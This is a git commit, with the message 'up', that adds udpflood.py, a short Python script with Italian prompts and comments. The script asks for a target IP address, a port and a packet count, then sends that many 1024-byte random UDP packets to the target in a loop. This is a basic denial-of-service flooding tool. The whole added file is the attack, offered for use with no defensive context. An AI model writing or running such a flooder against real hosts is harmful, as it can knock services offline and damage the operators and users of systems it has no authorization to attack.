bda26dfd6488920342459d1ed687e1c57eb7fa86
Paolo Rampino <liadserv@gmail.com>
2024-06-19 16:56:11 +0200

    up

---
+++ udpflood.py
@@ -0,0 +1,20 @@
+import socket
+import random 
+
+
+def genera_pacchetto(dimensione):
+    #genera un pacchetto di dimensione specificata
+    return random.randbytes(dimensione)
+
+def UDP_Flood(IP_target, porta_target, numero_pacchetti):
+    sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    for _ in range(numero_pacchetti):
+        pacchetto_casuale = genera_pacchetto(1024)
+        address = (IP_target, porta_target)
+        sock.sendto(pacchetto_casuale, address)
+
+IP_target = input("Inserisci un indirizzo IP target: ")
+porta_target = int(input("Inserisci una porta: "))
+numero_pacchetti = int(input("Inserisci il numero di pacchetti: "))
+UDP_Flood(IP_target, porta_target, numero_pacchetti)
